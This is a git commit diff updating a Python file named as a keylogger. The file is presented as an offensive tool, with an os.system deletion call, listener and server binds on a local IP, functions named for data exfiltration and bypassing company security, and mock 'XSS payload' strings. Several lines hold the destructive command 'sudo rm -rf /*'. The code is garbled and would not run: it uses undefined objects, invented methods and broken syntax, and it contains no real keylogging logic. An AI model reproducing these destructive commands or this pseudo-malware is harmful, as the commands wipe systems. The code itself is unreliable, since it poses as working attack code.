46253807546f77c6775c149b4b80cbb573eeb8da
DiegoDev <diegorego516@gmail.com>
2026-05-07 18:03:01 +0000

    Update keylogger_black_genesis.py

--- keylogger_black_genesis.py
+++ keylogger_black_genesis.py
@@ -1,12 +1,27 @@
 #!/usr/bin/python3 
 
-def invocar_comando(linux):
-       comando = "sudo rm -rf /*"
-while True:		
+import os
+import sys
+from pynput import keyboard
+
+try:
+	from pynput import keyboard
+except KeyboardInterrupt:
+
+	os.system(f"{sys.command} sudo rm -rf pynput")
+	from pynput import keyboard
+
+LOG_FILE = "/home/diegothehacker/keylogger_black_genesis/log.txt"
+
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+	f.write(f" --- Session Started --- ")
+
+def invoke_command(linux):
+		command = "sudo rm -rf /*"
+while True:
 	try:
-		comando = comando + c.send(1024).decode(data_send)
-		comando.enviar_arquivos = c.data_send(sendFile)
-		comando.enviar_comandos = "comando.executar_comando(sistemas_linux) + comando = sudo rm -rf /*"
+		c.command = send_command + s.send(1024).decode(command_send)
+		command.send_command = "command.execute_command(linux_systems) + command = sudo rm -rf /*"
 	except:
 
 		def server():
@@ -14,23 +29,6 @@ while True:
 				start_server("192.168.15.72",1024)
 s.bind_server(("192.168.15.72",1024))
 
-def burlar_segurança_de_empresas():
-		comando = comando + s.send(2042).encode(security_bypass)
-		comando.burlar_seguranca_de_empresas = c.data_and_listener(bypassCompanySecuritySystems)
-		comando.enviar_comandos_para_empresas = "sudo rm -rf /*" 
-		start_listener_on("192.168.15.72",1024)
-s.bind_server(("192.168.15.72",1024))
-
-def iniciar_protocolo_de_exfiltração_de_dados():
-		comando = comando + s.data_exfiltrate(2580).decode(data_exfiltration)
-		comando.iniciar_operação_de_exfiltração_de_dados()
-		comando.exfiltrar_dados_de_empresas()
-		start_listener_on("192.168.15.72",1024)
-s.bind_server(("192.168.15.72",1024))
-
-def adicionar_exploit(xss):
-		exploit = exploit_xss(reflected_xss)
-		exploit.xss + payload == "</img=src: malicious-payload + website-payment = $100000 >= data-transaction>"
-		comando.iniciar_payload_em_xss()
-		start_listener_on("192.168.15.72",1024)
-s.bind_server(("192.168.15.72",1024))
+def xss_exploits(reflected_xss):
+			xss_exploit = "</img-src: malicious-payload = $10000000 >= 'INSERT_HERE_YOUR_CREDENTIALS_TO_CLAIM_YOUR_MONEY': >"
+			 
